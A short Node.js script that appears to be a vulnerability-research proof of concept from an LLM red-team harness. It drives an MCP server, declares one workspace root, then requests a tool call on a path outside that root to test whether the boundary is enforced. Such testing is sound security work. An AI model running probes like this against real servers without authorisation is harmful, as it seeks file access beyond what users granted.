import { spawn } from 'node:child_process';
const srv = process.argv[2];
const child = spawn(process.execPath, [srv], { stdio: ['pipe','pipe','pipe'] });
let buf = ''; const pending = new Map();
child.stderr.on('data', d => process.stderr.write('[SRV] ' + d.toString().slice(0, 500)));
child.stdout.on('data', (d) => { buf += d.toString(); let idx;
  while ((idx = buf.indexOf('\n')) >= 0) { const line = buf.slice(0, idx).trim(); buf = buf.slice(idx+1); if (!line) continue;
    let msg; try { msg = JSON.parse(line); } catch { continue; }
    if (msg.method && msg.id !== undefined) {
      if (msg.method === 'roots/list') child.stdin.write(JSON.stringify({ jsonrpc: '2.0', id: msg.id, result: { roots: [{ uri: 'file:///Users/matheusvsky/Documents/trab/llm-redteam-harness/engagements/angular-cli-2026-08/payload-proposals/vrp/pocs/M2-mcp-roots/repoc-pin/workspace' }] } }) + '\n');
      else child.stdin.write(JSON.stringify({ jsonrpc: '2.0', id: msg.id, result: {} }) + '\n');
      continue;
    }
    if (msg.id && pending.has(msg.id)) { pending.get(msg.id)(msg); pending.delete(msg.id); }
  }});
const call = (id, method, params) => new Promise((res) => { pending.set(id, res); child.stdin.write(JSON.stringify({jsonrpc:'2.0', id, method, params}) + '\n'); setTimeout(()=>res({timeout:true}), 30000); });
async function main() {
  await call(1, 'initialize', { protocolVersion: '2025-06-18', capabilities: { roots: { listChanged: true } }, clientInfo: { name: 'poc2neg', version: '1' } });
  child.stdin.write(JSON.stringify({jsonrpc:'2.0', method:'notifications/initialized'}) + '\n');
  await new Promise(r=>setTimeout(r, 1800));
  const r = await call(3, 'tools/call', { name: 'get_best_practices', arguments: { workspacePath: '/tmp/mcp-repoc2' } });
  console.log('TOOL-RESP-OUTSIDE:', JSON.stringify(r).slice(0, 1200));
  child.kill(); process.exit(0);
}
main();
